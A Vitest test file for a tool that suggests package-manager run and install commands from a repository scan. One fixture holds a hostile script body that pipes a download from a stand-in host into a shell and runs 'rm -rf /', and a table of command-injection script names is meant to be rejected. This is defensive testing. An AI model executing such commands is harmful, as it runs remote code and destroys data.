// Stage 2B: command suggestions built from Stage 2A insights and the scan.
import { describe, expect, it } from "vitest";
import { detectProjects } from "../../../src/lib/insights/detectProjects";
import { MAX_SUGGESTIONS, isSafeScriptName, suggestCommands } from "../../../src/lib/insights/suggestCommands";
import type { CommandSuggestion, CommandSuggestions, Confidence } from "../../../src/lib/insights/types";
import { deepFreeze, pkg, scan, type ScanOptions } from "./builders";

const suggest = (options: ScanOptions) => suggestCommands(scan(options));
const scripts = (set: CommandSuggestions) => set.suggestions.filter((s) => s.source === "script");
const installs = (set: CommandSuggestions) => set.suggestions.filter((s) => s.source === "install");
const rank = (c: Confidence | null) => (c === null ? -1 : { low: 0, medium: 1, high: 2 }[c]);
const codes = (s: CommandSuggestion) => s.caveats.map((c) => c.code);

const viteApp = (extra: Partial<Parameters<typeof pkg>[1]> = {}) =>
  pkg("package.json", { deps: ["react"], dev: ["vite"], scripts: { dev: "vite", build: "vite build" }, ...extra });

describe("package managers", () => {
  it.each([
    ["package-lock.json", "npm", "npm run dev", "npm install"],
    ["pnpm-lock.yaml", "pnpm", "pnpm run dev", "pnpm install"],
    ["yarn.lock", "yarn", "yarn run dev", "yarn install"],
    ["bun.lockb", "bun", "bun run dev", "bun install"],
  ])("%s -> %s", (lockfile, manager, run, install) => {
    const set = suggest({ packages: [viteApp()], files: [lockfile, "vite.config.ts"] });
    expect(scripts(set)).toHaveLength(1);
    expect(scripts(set)[0]).toMatchObject({ packageManager: manager, command: run, scriptName: "dev", purpose: "develop", confidence: "high", directory: "." });
    expect(installs(set)).toHaveLength(1);
    expect(installs(set)[0]).toMatchObject({ packageManager: manager, command: install, purpose: "install", scriptName: null, scriptCommandText: null });
  });

  it("unknown package manager: no command and no assumed npm, with an explicit reason", () => {
    const set = suggest({ packages: [viteApp()], files: ["vite.config.ts"] });
    for (const s of set.suggestions) {
      expect(s).toMatchObject({ packageManager: null, command: null, unavailableReason: "package-manager-unknown", confidence: null });
      expect(codes(s)).toContain("package-manager-unknown");
    }
    expect(JSON.stringify(set.suggestions.map((s) => s.command))).not.toContain("npm");
  });

  it("conflicting lockfiles: every alternative kept, each marked ambiguous and at most low", () => {
    const set = suggest({ packages: [viteApp()], files: ["package-lock.json", "yarn.lock", "vite.config.ts"] });
    expect(scripts(set).map((s) => s.command)).toEqual(["npm run dev", "yarn run dev"]);
    expect(installs(set).map((s) => s.command)).toEqual(["npm install", "yarn install"]);
    for (const s of set.suggestions) {
      expect(s.packageManagerAmbiguous).toBe(true);
      expect(s.confidence).toBe("low");
      expect(codes(s)).toContain("package-manager-ambiguous");
    }
  });

  it("packageManager field conflicting with the lockfile: alternatives, not a winner", () => {
    const set = suggest({ packages: [viteApp({ packageManager: "pnpm@9.0.0" })], files: ["package-lock.json"] });
    expect(scripts(set).map((s) => s.packageManager)).toEqual(["npm", "pnpm"]);
    expect(scripts(set).every((s) => s.packageManagerAmbiguous)).toBe(true);
  });

  it("packageManager field alone: a command at medium at most", () => {
    const set = suggest({ packages: [viteApp({ packageManager: "yarn@4.1.0" })], files: ["vite.config.ts"] });
    expect(scripts(set)[0]).toMatchObject({ command: "yarn run dev", confidence: "medium" });
  });
});

describe("scripts", () => {
  it("existing dev and start scripts become separate suggestions with purposes, in preference order", () => {
    const set = suggest({ packages: [pkg("package.json", { deps: ["express"], scripts: { start: "node server.js", dev: "nodemon server.js", test: "jest" } })], files: ["pnpm-lock.yaml"] });
    expect(scripts(set).map((s) => [s.scriptName, s.purpose, s.command])).toEqual([
      ["dev", "develop", "pnpm run dev"],
      ["start", "start", "pnpm run start"],
    ]);
  });

  it("never invents scripts: every suggested script exists in that package.json", () => {
    const options: ScanOptions = {
      packages: [
        pkg("package.json", { workspaces: ["apps/*"], scripts: { dev: "turbo run dev", "dev:all": "turbo run dev --parallel", lint: "turbo run lint" } }),
        pkg("apps/web/package.json", { deps: ["next"], scripts: { dev: "next dev", start: "next start", build: "next build" } }),
        pkg("apps/api/package.json", { deps: ["@nestjs/core"], scripts: { "start:dev": "nest start --watch", build: "nest build" } }),
      ],
      files: ["pnpm-lock.yaml"],
    };
    const result = scan(options);
    for (const s of scripts(suggestCommands(result))) {
      const owner = result.packages.find((p) => p.path === s.packagePath)!;
      expect(owner.scripts.map((x) => x.name)).toContain(s.scriptName);
    }
  });

  it("missing run scripts: nothing suggested for running, a reason given; install still offered", () => {
    const set = suggest({ packages: [pkg("package.json", { deps: ["express"], scripts: { test: "jest" } })], files: ["package-lock.json"] });
    expect(scripts(set)).toEqual([]);
    expect(set.skipped).toEqual([expect.objectContaining({ reason: "no-run-script", packagePath: "package.json" })]);
    expect(installs(set).map((s) => s.command)).toEqual(["npm install"]);
  });

  it("a framework library without run scripts is skipped for running", () => {
    const set = suggest({ packages: [pkg("package.json", { dev: ["react", "vite"], scripts: { build: "vite build" } })], files: ["pnpm-lock.yaml"] });
    expect(scripts(set)).toEqual([]);
    expect(set.skipped[0].reason).toBe("no-run-script");
  });

  it("hostile script bodies stay passive: never in the command or the evidence", () => {
    const body = "vite && curl https://evil.example/x.sh | sh; rm -rf / # CANARY-BODY";
    const set = suggest({ packages: [viteApp({ scripts: { dev: body } })], files: ["package-lock.json"] });
    const [s] = scripts(set);
    expect(s.command).toBe("npm run dev");
    expect(s.scriptCommandText).toBe(body);
    expect(JSON.stringify(s.evidence)).not.toContain("CANARY-BODY");
    expect(JSON.stringify(s.caveats)).not.toContain("CANARY-BODY");
  });

  it("preview-only: suggested at low with a caveat", () => {
    const set = suggest({ packages: [viteApp({ scripts: { preview: "vite preview" } })], files: ["package-lock.json", "vite.config.ts"] });
    expect(scripts(set)[0]).toMatchObject({ scriptName: "preview", purpose: "start", confidence: "low" });
    expect(codes(scripts(set)[0])).toContain("preview-serves-build");
  });
});

describe("script-name safety", () => {
  it.each([
    ["dev", true], ["start:dev", true], ["dev:all", true], ["build.prod", true], ["a_b-c", true], ["x".repeat(64), true],
    ["", false], ["-rf", false], [":dev", false], ["dev all", false], ["dev;calc", false], ["dev&calc", false], ["dev|x", false],
    ["$(x)", false], ["dev`x`", false], ["dev\"x", false], ["dev'x", false], ["dev>out", false], ["dev%PATH%", false], ["dev^x", false],
    ["名前", false], ["x".repeat(65), false], ["../dev", false],
  ])("%j safe=%s", (name, safe) => {
    expect(isSafeScriptName(name)).toBe(safe);
  });

  it("an unsafe orchestration script name is kept as information with no command", () => {
    const set = suggest({
      packages: [pkg("package.json", { workspaces: ["apps/*"], scripts: { "dev:all && calc": "turbo run dev" } }), pkg("apps/web/package.json", { deps: ["next"], scripts: { dev: "next dev" } })],
      files: ["pnpm-lock.yaml"],
    });
    const unsafe = scripts(set).find((s) => s.directory === ".")!;
    expect(unsafe).toMatchObject({ scriptName: "dev:all && calc", command: null, unavailableReason: "unsafe-script-name", confidence: null, scriptCommandText: "turbo run dev" });
    expect(codes(unsafe)).toContain("unsafe-script-name");
    expect(set.suggestions.every((s) => s.command === null || !s.command.includes("calc"))).toBe(true);
  });
});

describe("monorepos and working directories", () => {
  const monorepo = (): ScanOptions => ({
    packages: [
      pkg("package.json", { workspaces: ["apps/*", "packages/*"], scripts: { dev: "turbo run dev", build: "turbo run build", postinstall: "husky" } }),
      pkg("apps/web/package.json", { deps: ["react"], dev: ["vite"], scripts: { dev: "vite", predev: "node gen.js" } }),
      pkg("apps/api/package.json", { deps: ["@nestjs/core"], scripts: { "start:dev": "nest start --watch", start: "node dist/main.js", prepare: "x" } }),
      pkg("packages/ui/package.json", { deps: ["react"], scripts: { build: "tsc" } }),
      pkg("legacy/package.json", { deps: ["express"], scripts: { start: "node index.js" } }),
    ],
    files: ["pnpm-lock.yaml", "turbo.json", "apps/web/vite.config.ts", "legacy/yarn.lock"],
  });

  it("each runnable app gets its own root-relative directory; no cd prefixes", () => {
    const set = suggest(monorepo());
    const runs = scripts(set).map((s) => [s.directory, s.command]);
    expect(runs).toEqual(expect.arrayContaining([
      ["apps/web", "pnpm run dev"],
      ["apps/api", "pnpm run start:dev"],
      ["apps/api", "pnpm run start"],
      ["legacy", "yarn run start"],
    ]));
    for (const s of set.suggestions) {
      expect(s.command ?? "").not.toMatch(/\bcd\b|&&|[\\/]/);
      expect(s.directory).not.toMatch(/^[A-Za-z]:|^\//);
    }
  });

  it("root orchestration is its own possibility, marked as running several packages", () => {
    const root = scripts(suggest(monorepo())).filter((s) => s.directory === ".");
    expect(root.map((s) => s.command)).toEqual(["pnpm run dev"]);
    expect(root[0].orchestration).toBe("turbo");
    expect(codes(root[0])).toContain("runs-multiple-packages");
    expect(rank(root[0].confidence)).toBeLessThanOrEqual(1);
  });

  it("install once at the workspace root; a package with its own lockfile installs separately", () => {
    const set = suggest(monorepo());
    expect(installs(set).map((s) => [s.directory, s.command])).toEqual([
      [".", "pnpm install"],
      ["legacy", "yarn install"],
    ]);
  });

  it("install caveats name project install scripts across the workspace", () => {
    const rootInstall = installs(suggest(monorepo())).find((s) => s.directory === ".")!;
    const text = rootInstall.caveats.find((c) => c.code === "install-runs-project-scripts")!.text;
    expect(text).toContain("postinstall");
    expect(text).toContain("prepare (apps/api)");
    expect(codes(rootInstall)).toContain("install-runs-dependency-scripts");
  });

  it("libraries and the workspace root without run scripts are explained, not suggested", () => {
    const set = suggest({ ...monorepo(), packages: monorepo().packages!.map((p) => (p.path === "package.json" ? pkg("package.json", { workspaces: ["apps/*"] }) : p)) });
    expect(set.skipped.map((s) => [s.directory, s.reason])).toEqual(expect.arrayContaining([
      [".", "workspace-root-without-run-script"],
      ["packages/ui", "no-run-script"],
    ]));
  });

  it("single-package install from the package itself", () => {
    expect(installs(suggest({ packages: [viteApp()], files: ["bun.lockb"] })).map((s) => [s.directory, s.command])).toEqual([[".", "bun install"]]);
  });
});

describe("lifecycle hooks", () => {
  it("pre/post hooks of the suggested script are named, with 'may run' wording", () => {
    const set = suggest({ packages: [viteApp({ scripts: { dev: "vite", predev: "node a.js", postdev: "node b.js", prestart: "x" } })], files: ["package-lock.json"] });
    const caveat = scripts(set)[0].caveats.find((c) => c.code === "lifecycle-hooks")!;
    expect(caveat.text).toContain("predev and postdev");
    expect(caveat.text).toContain("may run");
    expect(caveat.text).not.toContain("prestart");
  });

  it("install hooks in a single package are named", () => {
    const set = suggest({ packages: [viteApp({ scripts: { dev: "vite", preinstall: "x", postinstall: "y", prepare: "z" } })], files: ["package-lock.json"] });
    expect(installs(set)[0].caveats.find((c) => c.code === "install-runs-project-scripts")!.text).toContain("preinstall, postinstall, prepare");
  });

  it("no hooks: no hook caveat, but install still warns about dependency scripts", () => {
    const set = suggest({ packages: [viteApp()], files: ["package-lock.json"] });
    expect(codes(scripts(set)[0])).not.toContain("lifecycle-hooks");
    expect(codes(installs(set)[0])).not.toContain("install-runs-project-scripts");
    expect(codes(installs(set)[0])).toContain("install-runs-dependency-scripts");
  });

  it("truncated scripts: hooks can't be ruled out and confidence is capped", () => {
    const set = suggest({ packages: [viteApp({ scriptsTruncated: true })], files: ["package-lock.json", "vite.config.ts"] });
    const [run] = scripts(set);
    expect(codes(run)).toEqual(expect.arrayContaining(["scripts-truncated", "hooks-may-be-incomplete"]));
    expect(run.confidence).toBe("medium");
    expect(codes(installs(set)[0])).toContain("hooks-may-be-incomplete");
  });

  it("truncated scripts with no run script seen: skipped as unknown, not as 'no run script'", () => {
    const set = suggest({ packages: [pkg("package.json", { deps: ["express"], scripts: { build: "tsc" }, scriptsTruncated: true })], files: ["package-lock.json"] });
    expect(set.skipped[0].reason).toBe("scripts-truncated");
  });
});

describe("confidence and uncertainty", () => {
  it("high only with a complete scan, a lockfile and a script invoking the detected framework", () => {
    const strong = suggest({ packages: [viteApp()], files: ["pnpm-lock.yaml", "vite.config.ts"] });
    expect(scripts(strong)[0].confidence).toBe("high");
    expect(scripts(suggest({ packages: [viteApp({ scripts: { dev: "custom-dev-server" } })], files: ["pnpm-lock.yaml", "vite.config.ts"] }))[0].confidence).toBe("low");
    expect(scripts(suggest({ packages: [pkg("package.json", { scripts: { start: "node index.js" } })], files: ["pnpm-lock.yaml"] }))[0].confidence).toBe("medium");
  });

  it.each([["truncated", ["entries"]], ["cancelled", []], ["timed-out", ["time"]]] as const)("a %s scan never yields high and is flagged", (status, limitsHit) => {
    const set = suggest({ packages: [viteApp()], files: ["pnpm-lock.yaml", "vite.config.ts"], status, limitsHit: [...limitsHit] });
    expect(set.scanComplete).toBe(false);
    expect(set.suggestions.length).toBeGreaterThan(0);
    for (const s of set.suggestions) {
      expect(rank(s.confidence)).toBeLessThanOrEqual(1);
      expect(s.scanIncomplete).toBe(true);
      expect(codes(s)).toContain("scan-incomplete");
    }
  });

  it("several frameworks or indirect framework evidence add caveats", () => {
    const multiple = scripts(suggest({ packages: [pkg("package.json", { deps: ["next", "express"], scripts: { dev: "next dev" } })], files: ["package-lock.json"] }))[0];
    expect(codes(multiple)).toContain("multiple-frameworks");
    const indirect = scripts(suggest({ packages: [pkg("package.json", { scripts: { dev: "next dev" } })], files: ["package-lock.json"] }))[0];
    expect(codes(indirect)).toContain("framework-uncertain");
    expect(rank(indirect.confidence)).toBeLessThanOrEqual(1);
  });

  it("every suggestion has evidence and says it was not run or verified", () => {
    const set = suggest({
      packages: [pkg("package.json", { workspaces: ["a/*"], scripts: { dev: "turbo run dev" } }), pkg("a/x/package.json", { deps: ["express"], scripts: { start: "node i.js" } })],
      files: ["package-lock.json", "yarn.lock"],
    });
    for (const s of set.suggestions) {
      expect(s.evidence.length).toBeGreaterThan(0);
      expect(s.caveats[0].code).toBe("not-verified");
      expect(s.caveats[0].text).toMatch(/Not run or verified\.$/);
    }
  });

  it("script suggestions say the script is repository code that can run anything and wasn't checked", () => {
    const set = suggest({ packages: [viteApp()], files: ["pnpm-lock.yaml", "vite.config.ts"] });
    const [run] = scripts(set);
    const caveat = run.caveats.find((c) => c.code === "runs-repository-script")!;
    expect(caveat.text).toMatch(/can execute any command/);
    expect(caveat.text).toMatch(/hasn't run, reviewed or security-checked/);
    // Installs carry their own script warnings instead.
    expect(installs(set)[0].caveats.map((c) => c.code)).toContain("install-runs-dependency-scripts");
    // No suggestion text claims the command is safe, tested or verified.
    for (const s of set.suggestions) {
      for (const c of s.caveats) expect(c.text).not.toMatch(/\b(is safe|safe to run|tested|verified to work|works)\b/i);
    }
  });
});

describe("unsupported and unknown projects", () => {
  it("Nuxt/Astro/Remix: recognized, no run suggestions yet", () => {
    const set = suggest({ packages: [pkg("package.json", { deps: ["nuxt"], scripts: { dev: "nuxt dev" } })], files: ["nuxt.config.ts", "package-lock.json"] });
    expect(scripts(set)).toEqual([]);
    expect(set.skipped[0]).toMatchObject({ reason: "unsupported-framework" });
  });

  it("non-Node and empty repositories produce no suggestions, with a reason", () => {
    expect(suggest({ files: ["requirements.txt"] })).toMatchObject({ suggestions: [], skipped: [{ reason: "non-node-project" }] });
    expect(suggest({})).toMatchObject({ suggestions: [], skipped: [{ reason: "no-packages" }] });
  });
});

describe("purity, determinism and bounds", () => {
  const options = (): ScanOptions => ({
    packages: [
      pkg("package.json", { workspaces: ["apps/*"], scripts: { dev: "turbo run dev" } }),
      pkg("apps/web/package.json", { deps: ["react"], dev: ["vite"], scripts: { dev: "vite", predev: "x" } }),
      pkg("apps/api/package.json", { deps: ["express"], scripts: { start: "node index.js" } }),
    ],
    files: ["pnpm-lock.yaml", "apps/web/vite.config.ts"],
  });

  it("does not modify its inputs, is deterministic and JSON-safe, with unique ids", () => {
    const result = deepFreeze(scan(options()));
    const insights = deepFreeze(detectProjects(result));
    const before = JSON.stringify([result, insights]);
    const first = suggestCommands(result, insights);
    expect(JSON.stringify([result, insights])).toBe(before);
    expect(suggestCommands(result, insights)).toEqual(first);
    expect(suggestCommands(scan({ ...options(), packages: [...options().packages!].reverse() }))).toEqual(first);
    expect(JSON.parse(JSON.stringify(first))).toEqual(first);
    const ids = first.suggestions.map((s) => s.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("output is bounded", () => {
    const packages = [pkg("package.json", { workspaces: ["p/*"] })];
    for (let i = 0; i < 200; i++) packages.push(pkg(`p/a${i}/package.json`, { deps: ["express"], scripts: { dev: "node a.js", start: "node b.js", serve: "node c.js" } }));
    const set = suggest({ packages, files: ["package-lock.json", "yarn.lock"] }); // conflicts double everything
    expect(set.suggestions.length).toBe(MAX_SUGGESTIONS);
    expect(set.suggestionsTruncated).toBe(true);
  });
});

describe("defensive rules (from mutation review)", () => {
  it("package-manager evidence is attached to each suggestion", () => {
    const set = suggest({ packages: [viteApp()], files: ["pnpm-lock.yaml", "vite.config.ts"] });
    for (const s of set.suggestions) expect(s.evidence.some((e) => e.kind === "lockfile" && e.text.includes("pnpm-lock.yaml"))).toBe(true);
  });

  it("a monorepo without lockfiles still installs once from the workspace root", () => {
    const set = suggest({
      packages: [
        pkg("package.json", { workspaces: ["apps/*"], packageManager: "pnpm@9.0.0" }),
        pkg("apps/web/package.json", { deps: ["next"], scripts: { dev: "next dev" } }),
        pkg("apps/api/package.json", { deps: ["express"], scripts: { start: "node i.js" } }),
      ],
    });
    expect(installs(set).map((s) => [s.directory, s.command])).toEqual([[".", "pnpm install"]]);
  });

  it("a root script that both starts a dev server and orchestrates is capped at medium", () => {
    const set = suggest({
      packages: [
        pkg("package.json", { workspaces: ["apps/*"], deps: ["react"], dev: ["vite"], scripts: { dev: "vite & turbo run dev --filter api" } }),
        pkg("apps/api/package.json", { deps: ["express"], scripts: { start: "node i.js" } }),
      ],
      files: ["pnpm-lock.yaml", "vite.config.ts"],
    });
    const root = scripts(set).find((s) => s.directory === ".")!;
    expect(root.orchestration).toBe("turbo");
    expect(root.confidence).toBe("medium");
  });

  it("insights claiming a complete scan's confidence are still capped when they record an incomplete scan", () => {
    const result = scan({ packages: [viteApp()], files: ["pnpm-lock.yaml", "vite.config.ts"] });
    const insights = detectProjects(result);
    const doctored = { ...insights, scanComplete: false, packages: insights.packages.map((p) => ({ ...p, uncertainties: [...p.uncertainties, "scan-incomplete" as const] })) };
    const set = suggestCommands(result, doctored);
    for (const s of scripts(set)) expect(rank(s.confidence)).toBeLessThanOrEqual(1);
  });

  it("insights that don't match the scan never produce scripts missing from package.json", () => {
    const withDev = scan({ packages: [viteApp()], files: ["pnpm-lock.yaml"] });
    const withoutDev = scan({ packages: [viteApp({ scripts: { build: "vite build" } })], files: ["pnpm-lock.yaml"] });
    const set = suggestCommands(withoutDev, detectProjects(withDev));
    expect(scripts(set)).toEqual([]);
  });
});
